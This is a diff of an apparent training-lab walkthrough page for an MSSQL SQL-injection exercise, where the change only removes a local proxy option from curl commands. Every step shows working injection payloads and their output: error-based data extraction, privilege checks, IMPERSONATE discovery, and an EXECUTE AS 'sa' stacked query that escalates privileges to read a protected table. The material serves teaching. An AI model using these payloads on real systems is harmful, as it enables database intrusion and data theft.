@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Lookup</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
         <span class="prompt">Input: </span>1<br>
         <span class="prompt">SQL: </span>SELECT id, title, content FROM notes WHERE id = '1'<br><br>
         <span class="prompt">Output:</span><br>
@@ -26,11 +26,11 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Current login:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -"<br><br>
         <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'lab14_web_user' to data type int.</strong><br><br>
         <span class="prompt">// Check sysadmin (should be NO):</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -"<br><br>
         <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'NOT_SYSADMIN' to data type int.</strong>
     </div>
@@ -45,11 +45,11 @@
         <span class="terminal-title">Step 3. Access Denied</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong><br><br>
         <span class="prompt">// UNION also fails:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "id=' UNION SELECT 1, flag, 'x' FROM flags -- -"<br>
+        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=' UNION SELECT 1, flag, 'x' FROM flags -- -"<br>
         <span class="prompt">Input: </span>' UNION SELECT 1, flag, 'x' FROM flags -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong>
     </div>
@@ -66,7 +66,7 @@
         <span class="terminal-title">Step 4. IMPERSONATE Discovery</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 pr2.name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' AND pr.name='lab14_web_user')) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 pr2.name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' AND pr.name='lab14_web_user')) -- -"<br><br>
         <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT TOP 1 pr2.name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' AND pr.name='lab14_web_user')) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'sa' to data type int.</strong><br><br>
         <span class="prompt">Found: </span>lab14_web_user can impersonate <strong>sa</strong> (sysadmin)!
@@ -85,11 +85,11 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Impersonate sa, copy flag to notes, revert:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br><br>
         <span class="prompt">Input: </span>1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -<br>
         <span class="prompt">Output: </span>Public Data -- This is publicly accessible information (stacked query executed silently)<br><br>
         <span class="prompt">// Now read note 1 (as original low-priv user):</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
         <span class="prompt">Input: </span>1<br>
         <span class="prompt">Output:</span><br>
         <strong>Public Data</strong><br>
@@ -135,13 +135,13 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Step 1: Direct access fails</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br>
         <span class="prompt">Result: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong><br><br>
         <span class="prompt">// Step 2: Impersonate sa and write flag to notes</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br>
         <span class="prompt">Result: </span>Public Data -- This is publicly accessible information (stacked query ran; flag written to notes)<br><br>
         <span class="prompt">// Step 3: Read the flag from notes</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br>
         <span class="prompt">Output: </span><strong>Public Data -- FLAG{ms_3x3cut3_4s_pr1v3sc}</strong>
     </div>
 </div>
